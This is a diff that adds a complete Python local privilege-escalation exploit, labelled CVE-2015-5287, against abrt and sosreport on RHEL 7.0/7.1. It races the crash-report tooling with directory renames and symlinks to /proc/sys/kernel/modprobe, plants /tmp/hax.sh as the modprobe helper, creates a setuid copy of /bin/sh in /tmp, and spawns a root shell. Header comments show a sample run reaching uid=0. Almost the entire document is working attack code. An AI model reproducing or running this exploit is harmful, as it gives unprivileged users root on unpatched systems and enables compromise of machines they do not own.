@@ -1,0 +1,114 @@
+#!/usr/bin/python
+# CVE-2015-5287 (?)
+# abrt/sosreport RHEL 7.0/7.1 local root
+# rebel 09/2015
+
+# [user@localhost ~]$ python sosreport-rhel7.py
+# crashing pid 19143
+# waiting for dump directory
+# dump directory:  /var/tmp/abrt/ccpp-2015-11-30-19:41:13-19143
+# waiting for sosreport directory
+# sosreport:  sosreport-localhost.localdomain-20151130194114
+# waiting for tmpfiles
+# tmpfiles:  ['tmpurfpyY', 'tmpYnCfnQ']
+# moving directory
+# moving tmpfiles
+# tmpurfpyY -> tmpurfpyY.old
+# tmpYnCfnQ -> tmpYnCfnQ.old
+# waiting for sosreport to finish (can take several minutes)........................................done
+# success
+# bash-4.2# id
+# uid=0(root) gid=1000(user) groups=0(root),1000(user) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+# bash-4.2# cat /etc/redhat-release 
+# Red Hat Enterprise Linux Server release 7.1 (Maipo)
+
+import os,sys,glob,time,sys,socket
+
+payload = "#!/bin/sh\ncp /bin/sh /tmp/sh\nchmod 6755 /tmp/sh\n"
+
+pid = os.fork()
+
+if pid == 0:
+	os.execl("/usr/bin/sleep","sleep","100")
+
+time.sleep(0.5)
+
+print "crashing pid %d" % pid
+
+os.kill(pid,11)
+
+print "waiting for dump directory"
+
+def waitpath(p):
+	while 1:
+		r = glob.glob(p)
+		if len(r) > 0:
+			return r
+		time.sleep(0.05)	
+
+dumpdir = waitpath("/var/tmp/abrt/cc*%d" % pid)[0]
+
+print "dump directory: ", dumpdir
+
+os.chdir(dumpdir)
+
+print "waiting for sosreport directory"
+
+sosreport = waitpath("sosreport-*")[0]
+
+print "sosreport: ", sosreport
+
+print "waiting for tmpfiles"
+tmpfiles = waitpath("tmp*")
+
+print "tmpfiles: ", tmpfiles
+
+print "moving directory"
+
+os.rename(sosreport, sosreport + ".old")
+os.mkdir(sosreport)
+os.chmod(sosreport,0777)
+
+os.mkdir(sosreport + "/sos_logs")
+os.chmod(sosreport + "/sos_logs",0777)
+
+os.symlink("/proc/sys/kernel/modprobe",sosreport + "/sos_logs/sos.log")
+os.symlink("/proc/sys/kernel/modprobe",sosreport + "/sos_logs/ui.log")
+
+print "moving tmpfiles"
+
+for x in tmpfiles:
+	print "%s -> %s" % (x,x + ".old")
+	os.rename(x, x + ".old")
+	open(x, "w+").write("/tmp/hax.sh\n")
+	os.chmod(x,0666)
+
+
+os.chdir("/")
+
+sys.stderr.write("waiting for sosreport to finish (can take several minutes)..")
+
+
+def trigger():
+	open("/tmp/hax.sh","w+").write(payload)
+	os.chmod("/tmp/hax.sh",0755)
+	try: socket.socket(socket.AF_INET,socket.SOCK_STREAM,132)
+	except: pass
+	time.sleep(0.5)
+	try:
+		os.stat("/tmp/sh")
+	except:
+		print "could not create suid"
+		sys.exit(-1)
+	print "success"
+	os.execl("/tmp/sh","sh","-p","-c",'''echo /sbin/modprobe > /proc/sys/kernel/modprobe;rm -f /tmp/sh;python -c "import os;os.setresuid(0,0,0);os.execl('/bin/bash','bash');"''')
+	sys.exit(-1)
+
+for x in xrange(0,60*10):
+	if "/tmp/hax" in open("/proc/sys/kernel/modprobe").read():
+		print "done"
+		trigger()
+	time.sleep(1)
+	sys.stderr.write(".")
+
+print "timed out"
